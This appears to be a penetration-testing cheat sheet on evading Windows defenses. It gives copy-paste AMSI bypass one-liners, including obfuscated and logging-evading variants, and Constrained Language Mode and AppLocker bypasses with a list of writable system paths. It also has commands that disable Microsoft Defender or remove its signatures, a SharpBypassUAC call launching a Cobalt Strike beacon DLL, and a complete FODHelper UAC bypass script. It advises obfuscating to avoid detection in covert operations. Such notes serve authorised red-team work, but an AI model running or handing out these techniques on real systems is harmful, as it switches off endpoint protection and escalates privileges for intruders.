## AMSI
### PowerShell AMSI Bypass

Patching AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged 🚩. Obfuscate, or even better, eliminate the need for an AMSI bypass altogether by altering your scripts to beat signature-based detection.

- ‘Plain’ AMSI bypass:

	```powershell
	[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
	```

- Obfuscation example for copy-paste purposes:

	```powershell
	sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
	```

- Another bypass, which is not detected by PowerShell autologging:

	```powershell
	[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
	```

> More bypasses [here](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell). For obfuscation, check [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), or get a pre-generated obfuscated version at [amsi.fail](https://amsi.fail/).

***

## Powershell CLM
### Enumeration
Sometimes you may find yourself in a PowerShell session that enforces Constrained Language Mode (CLM). This is very often the case when paired with AppLocker (see above).

You can identify you’re in constrained language mode by polling the following variable to get the current language mode. It will say `FullLanguage` for an unrestricted session, and `ConstrainedLanguage` for CLM. There are other language modes which I will not go into here.

```powershell
$ExecutionContext.SessionState.LanguageMode
```

### Bypasses
The constraints posed by CLM will block many of your exploitations attempts. One quick and dirty bypass is to use in-line functions, which sometimes works - if e.g. `whoami` is blocked, try the following:

```powershell
&{whoami}
```
- Use Powershell V2, If available
- Invoke powershell without using powershell.exe
	- [p3nt4/PowerShdll: Run PowerShell with rundll32. Bypass software restrictions. (github.com)](https://github.com/p3nt4/PowerShdll)

***


## AppLocker
### Enumeration
Identify AppLocker policy. Look for exempted binaries or paths to bypass.

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Bypasses
Some high-level bypass techniques:

-   Use [LOLBAS](https://lolbas-project.github.io/) if only (Microsoft-)signed binaries are allowed.
-   If binaries from `C:\Windows` are allowed, try dropping your binaries to `C:\Windows\Temp` or `C:\Windows\Tasks`. If there are no writable subdirectories but writable files exist in this directory tree, write your file to an alternate data stream (e.g. a JScript script) and execute it from there.

	**World writable locations**
	```powershell
	C:\Windows\Tasks
	C:\Windows\Temp
	C:\windows\tracing
	C:\Windows\Registration\CRMLog
	C:\Windows\System32\FxsTmp
	C:\Windows\System32\com\dmp
	C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
	C:\Windows\System32\spool\PRINTERS
	C:\Windows\System32\spool\SERVERS
	C:\Windows\System32\spool\drivers\color
	C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
	C:\Windows\SysWOW64\FxsTmp
	C:\Windows\SysWOW64\com\dmp
	C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
	C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
	```
-   Wrap your binaries in a DLL file and execute them with `rundll32` to bypass executable rules. If binaries like Python are allowed, use that. If that doesn’t work, try other techniques such as wrapping JScript in a HTA file or running XSL files with `wmic`.
- Download signed executables with known DLL-Side-Loading/PATH Hijacking vulns. Copy them and the forged DLLs to get code execution. [DLL Side-loading Appverif.exe – Fat Rodzianko](https://fatrodzianko.com/2020/02/15/dll-side-loading-appverif-exe/)

***


## Defender
### Disable defender

👀🚩

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true

Set-MpPreference -DisableIOAVProtection $true
```

Or leave Defender enabled, and just remove the signatures from it.

```powershell
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
***
### UAC Bypass

Using [SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC).

```bash
# Generate EncodedCommand
echo -n 'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update' | base64

# Use SharpBypassUAC e.g. from a CobaltStrike beacon
beacon> execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ==
```

In some cases, you may get away better with running a manual UAC bypass, such as the FODHelper bypass which is quite simple to execute in PowerShell.

```powershell
# The command to execute in high integrity context
$cmd = "cmd /c start powershell.exe"
 
# Set the registry values
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
 
# Trigger fodhelper to perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
# Clean registry
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```